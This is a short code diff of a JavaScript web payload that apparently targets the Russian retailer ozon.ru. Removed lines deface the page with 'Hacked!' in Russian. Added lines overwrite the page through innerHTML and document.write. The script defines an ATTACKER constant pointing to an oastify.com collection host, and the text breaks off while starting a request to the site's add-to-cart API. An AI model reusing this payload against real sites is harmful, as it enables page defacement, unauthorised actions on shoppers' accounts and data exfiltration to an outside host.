@@ -1,5 +1,8 @@
-alert('new_2');
-document.write('<html><body><h1>Взломано!</h1><p>Ваша страница теперь выглядит так.</p></body></html>');
+alert('new_3');
+document.documentElement.innerHTML = '<html><body><h1>Тест!</h1><p>Через innerHTML сработает точно.</p></body></html>';
+document.open();
+document.write('<html><body><h1>Тест!</h1><p>Явный open() помогает.</p></body></html>');
+document.close();
 var ATTACKER = 'https://dm3pjhjkpudpos6lmt41kc90xr3iref3.oastify.com';
 
 fetch('https://www.ozon.ru/api/composer-api.bx/_action/v2/addToCart', {
